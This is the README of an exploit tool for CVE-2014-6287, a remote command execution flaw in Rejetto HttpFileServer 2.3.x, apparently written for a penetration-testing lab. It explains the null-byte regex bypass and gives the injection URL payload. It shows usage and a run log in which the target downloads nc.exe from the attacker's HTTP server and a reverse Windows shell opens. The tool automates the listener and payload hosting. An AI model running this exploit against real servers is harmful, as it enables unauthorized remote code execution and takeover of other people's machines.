# rejetto_http_rce

HttpFileServer 2.3.x Remote Command Execution
Vendor Homepage: http://rejetto.com/
Software Link: http://sourceforge.net/projects/hfs/
Version: 2.3.x
CVE : CVE-2014-6287

## Summary 

This issue exists due to a poor regex in the file ParserLib.pas
function findMacroMarker(s:string; ofs:integer=1):integer;
begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
it will not handle null byte so a request to

http://localhost:80/?search=%00{.exec|cmd.}

will stop regex from parse macro , and macro will be executed and remote code injection happen.

## Notes

This is a rewrite as I did not like the public exploit. The public one you are required to manually start netcat 
listener and a http server, I wanted that part automated. 

## Usage

Run ./rejetto_http_rce to get the usage menu.

```sh
█▄▄▄▄ ▄███▄    ▄▄▄▄▄ ▄███▄     ▄▄▄▄▀ ████▄  ▄  █    ▄▄▄▄▀ ▄▄▄▄▀ █ ▄▄  █▄▄▄▄ ▄█▄    ▄███▄
█  ▄▀ █▀   ▀ ▄▀  █   █▀   ▀ ▀▀▀ █    █   █ █   █ ▀▀▀ █ ▀▀▀ █    █   █ █  ▄▀ █▀ ▀▄  █▀   ▀
█▀▀▌  ██▄▄       █   ██▄▄       █    █   █ ██▀▀█     █     █    █▀▀▀  █▀▀▌  █   ▀  ██▄▄
█  █  █▄   ▄▀ ▄ █    █▄   ▄▀   █     ▀████ █   █    █     █     █     █  █  █▄  ▄▀ █▄   ▄▀
  █   ▀███▀    ▀     ▀███▀    ▀               █    ▀     ▀       █      █   ▀███▀  ▀███▀
 ▀                                           ▀                    ▀    ▀
[windowsXP version without powershell]

Usage: ./rejetto_http_rce.py <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>
EXAMPLE: ./rejetto_http_rce.py http://xx.xx.xx.xx:9505 10.10.14.24 1337

```        

Run the exploit.

```sh
⬢  rejetto_http_rce  master ⦿ ./rejetto_http_rce.py http://xx.xx.xx.xx:9505 xx.xx.xx.xx 1337
[+] LHOST = xx.xx.xx.xx
[+] Netcat = 1337
[+] HTTP Listen = 8000
10.11.1.xx - - [26/Jan/2019 14:33:56] "GET /nc.exe HTTP/1.1" 200 -
10.11.1.xx - - [26/Jan/2019 14:33:57] "GET /nc.exe HTTP/1.1" 200 -
10.11.1.xx - - [26/Jan/2019 14:33:57] "GET /nc.exe HTTP/1.1" 200 -
10.11.1.xx - - [26/Jan/2019 14:33:57] "GET /nc.exe HTTP/1.1" 200 -

Connection from xx.xx.xx.xx:49683

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\HFS>
```
